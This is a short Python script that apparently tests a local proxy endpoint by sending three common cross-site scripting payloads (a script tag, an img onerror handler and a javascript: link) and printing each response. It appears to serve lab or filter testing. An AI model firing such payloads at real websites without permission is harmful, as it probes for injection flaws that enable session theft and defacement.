import requests

PROXY_URL = "http://proxy:5000/xss"

xss_payloads = [
    "<script>alert('XSS')</script>", 
    "<img src='x' onerror='alert(1)'>",
    "<a href='javascript:alert(1)'>Click me</a>",
]

def perform_xss_attack():
    for payload in xss_payloads:
        print(f"Attacking with XSS payload: {payload}")
        response = requests.get(PROXY_URL, params={'q': payload})
        print(f"Response: {response.status_code} - {response.text}")

if __name__ == "__main__":
    perform_xss_attack()
